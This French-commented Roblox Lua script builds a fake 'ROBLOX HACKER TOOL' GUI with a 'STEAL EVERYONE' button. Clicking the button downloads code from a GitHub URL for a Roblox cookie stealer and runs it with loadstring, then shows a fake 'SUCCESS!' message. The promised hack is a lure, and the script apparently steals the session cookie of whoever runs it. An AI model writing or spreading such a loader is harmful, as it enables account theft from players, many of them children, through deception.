-- Script GUI à exécuter dans Roblox
-- Ce script crée un bouton "STEAL EVERYONE" qui charge le token grabber

-- Services Roblox
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Créer le GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HackerToolGUI"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "🔓 ROBLOX HACKER TOOL V3.5 🔓"
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 50, 50)
title.TextScaled = true
title.Parent = frame

local stealButton = Instance.new("TextButton")
stealButton.Text = "STEAL EVERYONE"
stealButton.Size = UDim2.new(0.8, 0, 0.4, 0)
stealButton.Position = UDim2.new(0.1, 0, 0.5, 0)
stealButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
stealButton.TextColor3 = Color3.fromRGB(255, 255, 255)
stealButton.Parent = frame

-- Quand le joueur clique sur "STEAL EVERYONE"
stealButton.MouseButton1Click:Connect(function()
    stealButton.Text = "HACKING..."
    wait(2)

    -- Charger le script token grabber
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeInTheShell/roblox_token_stealer/codespace-crispy-enigma-w564qw7pq9r3v456/getRobloxCookie.lua"))()
    
    -- Simuler un hack réussi
    stealButton.Text = "SUCCESS!"
    wait(1)
    frame:Destroy()  -- Fermer le GUI après le "hack"
end)
